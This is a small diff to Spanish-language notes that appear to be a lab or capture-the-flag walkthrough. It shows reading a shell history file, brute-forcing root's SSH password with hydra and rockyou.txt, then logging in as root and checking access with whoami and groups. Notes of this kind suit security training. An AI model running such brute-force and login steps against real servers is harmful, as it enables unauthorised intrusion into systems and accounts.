@@ -25,5 +25,11 @@
 ++ cat .ash_history (Nos permite ver el historial de comandos ejecutados)
 ++ No nos aparece información útil, trataremos con otro método
 ++ hydra -l root -P rockyou.txt ssh://<ip_servidor> (Ataque de fuerza bruta para intentar descubrir la contraseña de root)
+++ La contraseña root fue encontrada, procedemos a ingresar
+++ ssh root@<ip_servidor> 
+++ Ingresar la contraseña
+++ Comprobar el inicio exitoso con los comandos:
+--- whoami
+--- groups
 
 
